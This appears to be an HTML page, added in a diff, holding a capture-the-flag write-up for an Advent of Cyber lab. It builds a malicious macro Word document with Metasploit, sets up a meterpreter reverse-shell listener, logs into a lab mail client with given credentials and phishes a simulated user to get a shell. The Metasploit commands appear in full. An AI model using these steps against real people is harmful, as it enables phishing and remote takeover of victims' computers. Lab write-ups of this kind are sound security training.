@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>(Day 10) - Advent of Cyber</title>
+    <link href="/index.css" rel="stylesheet" />
+  </head>
+
+  <body>
+    <article><div><h1>(Day 10) - Advent of Cyber</h1><h2>Creating the Malicious Document</h2><p>Opening a terminal, we will use Metasploit framework to make our Microsoft document exploit. Using the command: <code>msfconsole</code> Now we receive a Metasploit shell:</p><p><img src="/images/Pasted image 20241219150337.png" alt="Pasted image 20241219150337.png"></img></p><p>Now to obtain the exploit word document we need to run the following commands:</p><pre><code>set payload windows/meterpreter/reverse_tcp
+use exploit/multi/fileformat/office_word_macro
+set LHOST AttackBox_IP (e.g. '10.4.109.132')
+set LPORT 8888
+exploit
+exit
+</code></pre><p>Which will look like this:</p><p><img src="/images/Pasted image 20241219153006.png" alt="Pasted image 20241219153006.png"></img></p><h4>Creating the Listener</h4><p>Before we send the document to Marta we need to setup a listener to wait for connection to the IP and correct port. We will also use Metasploit framework, to do this we will run the following commands in the terminal:</p><pre><code>msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.4.109.132
+set LPORT 8888
+exploit
+</code></pre><h2>Emailing the Malicious Document</h2><p>We will now head to the website to send emails with the URL http://10.10.110.147.</p><p><img src="/images/Pasted image 20241219153612.png" alt="Pasted image 20241219153612.png"></img></p><p>Now logging in using the following credentials</p><ul><li>Email: <code>info@socnas.thm</code></li><li>Password: <code>MerryPhishMas!</code></li></ul><p>We have access to the email client and we can compose and send an email to Marta:</p><p><img src="/images/Pasted image 20241219154120.png" alt="Pasted image 20241219154120.png"></img></p><p>Upon sending the email and waiting a little bit, we see that Marta opens the document because we receive the connection in the listener:</p><p><img src="/images/Pasted image 20241219154313.png" alt="Pasted image 20241219154313.png"></img></p><p>Now we have a shell and by heading to the following directory <code>C:\Users\Administrator\Desktop</code> we see the flag and we can print it out: <code>THM{PHISHING</code>CHRISTMAS}<code></code></p></div></article>
+    <a href="/">Back to Home</a>
+  </body>
+  <hr>
+  <footer>
+    Made By Rishan
+  </footer>
+</html>
